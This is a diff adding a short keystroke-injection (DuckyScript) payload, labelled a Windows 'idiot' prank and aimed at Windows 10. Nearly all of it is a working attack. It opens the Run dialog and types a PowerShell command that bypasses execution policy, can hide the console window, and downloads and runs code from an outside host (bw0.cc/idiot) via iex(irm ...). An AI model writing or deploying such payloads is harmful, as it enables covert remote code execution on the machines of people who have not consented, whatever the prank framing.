@@ -1,0 +1,16 @@
+
+REM Title: Windows Idiot Prank
+REM Author: @beigeworm
+REM Description: This script recreates the Windows idiot virus in powershell
+REM Target: Windows 10
+
+REM To hide the console, use $hide='y' below. 
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C $hide='y'; iex (irm bw0.cc/idiot)
+ENTER
+
+
